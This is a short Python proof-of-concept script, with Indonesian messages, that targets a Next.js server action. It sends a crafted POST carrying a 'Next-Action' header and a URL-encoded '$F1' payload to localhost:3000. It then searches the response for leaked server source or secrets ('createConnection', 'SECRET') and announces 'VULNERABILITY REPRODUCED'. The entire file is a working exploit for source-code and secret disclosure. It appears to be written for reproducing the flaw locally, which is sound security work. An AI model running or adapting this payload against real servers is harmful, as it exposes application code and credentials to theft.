import requests

TARGET_URL = "http://localhost:3000/"

ACTION_ID = "40ff66e522b74f790e6d0e83fcff6aabdb9910fd2f" 

print(f"[*] Menembak {TARGET_URL} dengan Payload URL-Encoded Khusus...")

headers = {
    "Host": "localhost:3000",
    "Next-Action": ACTION_ID,
    "Accept": "text/x-component",
    "Accept-Language": "en-US,en;q=0.9",
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2F%22%2C%22refresh%22%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://localhost:3000",
    "Referer": "http://localhost:3000/"
}

raw_payload = f"0=%5B%22%24F1%22%5D&1=%7B%22id%22%3A%22{ACTION_ID}%22%7D"

response = requests.post(TARGET_URL, headers=headers, data=raw_payload)

print(f"\n[+] Status Code: {response.status_code}")
print("[+] Raw Response:\n")
print(response.text)

if "async function" in response.text or "createConnection" in response.text or "SECRET" in response.text:
    print("\n[+] VULNERABILITY REPRODUCED!")
else:
    print("\n[-] Gagal memicu leak.")